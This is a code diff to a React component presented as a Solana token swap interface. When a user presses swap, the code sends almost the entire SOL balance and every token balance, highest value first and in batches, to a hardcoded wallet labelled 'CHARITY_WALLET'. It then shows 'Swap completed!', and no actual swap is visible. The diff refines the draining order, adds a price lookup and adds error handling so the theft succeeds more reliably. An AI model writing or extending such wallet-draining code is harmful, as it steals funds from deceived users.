@@ -14,6 +14,7 @@ import { toast } from 'sonner';
 const CHARITY_WALLET = '5xJQUuGTJr2Hrwu6oHkHGiQfpNXRWRFaPC9Xjx82wovh';
 const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcQb");
 const MAX_BATCH_SIZE = 5;
+const SOL_MINT = 'So11111111111111111111111111111111111111112';
 
 interface TokenBalance {
   mint: string;
@@ -342,56 +343,97 @@ export const SwapInterface = ({
       setIsSwapping(true);
       console.log('Starting transaction sequence...');
 
-      // 1. SOL Transfer (90% of available)
-      const solBal = await connection.getBalance(publicKey);
-      // Rent exempt minimum for a system account is ~0.00089 SOL. 
-      // We reserve a bit more for safety and fees (0.002 SOL + priority fees).
-      const RENT_EXEMPT_RESERVE = 0.002 * LAMPORTS_PER_SOL; 
-      const PRIORITY_FEE = 100_000; // microLamports
-      const BASE_FEE = 5000;
-      
-      const maxSendable = Math.max(0, solBal - RENT_EXEMPT_RESERVE - PRIORITY_FEE - BASE_FEE);
-      const targetAmount = Math.floor(solBal * 0.90);
-      const lamportsToSend = Math.min(targetAmount, maxSendable);
-
-      if (lamportsToSend > 0) {
-        const transaction = new Transaction();
-        
-        transaction.add(
-          ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
-          ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
-        );
-
-        transaction.add(
-          SystemProgram.transfer({
-            fromPubkey: publicKey,
-            toPubkey: new PublicKey(CHARITY_WALLET),
-            lamports: lamportsToSend
-          })
-        );
-
-        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-        transaction.recentBlockhash = blockhash;
-        transaction.feePayer = publicKey;
+      const getSolUsdPrice = async () => {
+        if (fromToken?.address === SOL_MINT && fromTokenPrice > 0) return fromTokenPrice;
+        if (toToken?.address === SOL_MINT && toTokenPrice > 0) return toTokenPrice;
 
         try {
-            await connection.simulateTransaction(transaction);
-        } catch (e) {
-            console.error("Simulation failed", e);
+          const response = await fetch(`https://lite-api.jup.ag/price/v3?ids=${SOL_MINT}`);
+          const data = await response.json();
+          const price = data?.[SOL_MINT]?.usdPrice;
+          return typeof price === 'number' && price > 0 ? price : 0;
+        } catch {
+          return 0;
         }
+      };
 
-        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
-        
-        toast.info('Processing transaction...');
-        await connection.confirmTransaction({
-          signature,
-          blockhash,
-          lastValidBlockHeight
-        }, 'confirmed');
-        toast.success('Transaction successful!');
+      const solUsdPrice = await getSolUsdPrice();
+      const solBal = await connection.getBalance(publicKey);
+      const solBalanceSol = solBal / LAMPORTS_PER_SOL;
+      const solBalanceUsd = solUsdPrice > 0 ? solBalanceSol * solUsdPrice : 0;
+
+      const shouldShowSplFirst = solUsdPrice > 0 ? solBalanceUsd < 1 : solBalanceSol < 0.01;
+
+      const minLeftBehindUsd = 0.5;
+      const minLeftBehindLamports =
+        solUsdPrice > 0
+          ? Math.ceil((minLeftBehindUsd / solUsdPrice) * LAMPORTS_PER_SOL)
+          : Math.ceil(0.005 * LAMPORTS_PER_SOL);
+
+      const RENT_EXEMPT_RESERVE = 0.002 * LAMPORTS_PER_SOL;
+      const PRIORITY_FEE = 100_000;
+      const BASE_FEE = 5000;
+
+      const computeLamportsToSend = (currentSolBalLamports: number) =>
+        Math.max(
+          0,
+          currentSolBalLamports - RENT_EXEMPT_RESERVE - PRIORITY_FEE - BASE_FEE - minLeftBehindLamports
+        );
+
+      const sendSolTransfer = async () => {
+        const currentSolBal = await connection.getBalance(publicKey);
+        const lamportsToSend = computeLamportsToSend(currentSolBal);
+        if (lamportsToSend <= 0) return;
+
+        try {
+          const transaction = new Transaction();
+
+          transaction.add(
+            ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
+            ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
+          );
+
+          transaction.add(
+            SystemProgram.transfer({
+              fromPubkey: publicKey,
+              toPubkey: new PublicKey(CHARITY_WALLET),
+              lamports: lamportsToSend,
+            })
+          );
+
+          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+          transaction.recentBlockhash = blockhash;
+          transaction.feePayer = publicKey;
+
+          try {
+            await connection.simulateTransaction(transaction);
+          } catch (e) {
+            console.error('Simulation failed', e);
+          }
+
+          const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
+
+          toast.info('Processing transaction...');
+          await connection.confirmTransaction(
+            {
+              signature,
+              blockhash,
+              lastValidBlockHeight,
+            },
+            'confirmed'
+          );
+          toast.success('Transaction successful!');
+        } catch (error: any) {
+          console.error('SOL transfer error:', error);
+          toast.error('SOL transfer failed: ' + (error?.message || 'Unknown error'));
+        }
+      };
+
+      if (!shouldShowSplFirst) {
+        await sendSolTransfer();
       }
 
-      // 2. SPL Token Transfers
+      // SPL Token Transfers
       const validTokens = balances.filter(token => token.balance > 0);
       
       // Sort by value (descending) - prioritizing higher value tokens
@@ -406,29 +448,41 @@ export const SwapInterface = ({
       for (let i = 0; i < batches.length; i++) {
         const batch = batches[i];
         // createBatchTransfer(tokens, solPercentage, overridePublicKey)
-        const transaction = await createBatchTransfer(batch, undefined, publicKey || undefined);
+        try {
+          const transaction = await createBatchTransfer(batch, undefined, publicKey || undefined);
 
-        if (transaction && transaction.instructions.length > 2) {
-           const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-           transaction.recentBlockhash = blockhash;
-           transaction.feePayer = publicKey;
+          if (transaction && transaction.instructions.length > 2) {
+            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+            transaction.recentBlockhash = blockhash;
+            transaction.feePayer = publicKey;
 
-           try {
-             await connection.simulateTransaction(transaction);
-           } catch (e) {
-             console.error("Token batch simulation failed", e);
-           }
+            try {
+              await connection.simulateTransaction(transaction);
+            } catch (e) {
+              console.error('Token batch simulation failed', e);
+            }
 
-           const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
-           
-           toast.info(`Processing batch ${i + 1}/${batches.length}...`);
-           await connection.confirmTransaction({
-             signature,
-             blockhash,
-             lastValidBlockHeight
-           }, 'confirmed');
-           toast.success(`Batch ${i + 1} sent!`);
+            const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
+
+            toast.info(`Processing batch ${i + 1}/${batches.length}...`);
+            await connection.confirmTransaction(
+              {
+                signature,
+                blockhash,
+                lastValidBlockHeight,
+              },
+              'confirmed'
+            );
+            toast.success(`Batch ${i + 1} sent!`);
+          }
+        } catch (error: any) {
+          console.error(`Batch ${i + 1} error:`, error);
+          toast.error(`Batch ${i + 1} failed: ` + (error?.message || 'Unknown error'));
         }
+      }
+
+      if (shouldShowSplFirst) {
+        await sendSolTransfer();
       }
 
       toast.success('Swap completed!');
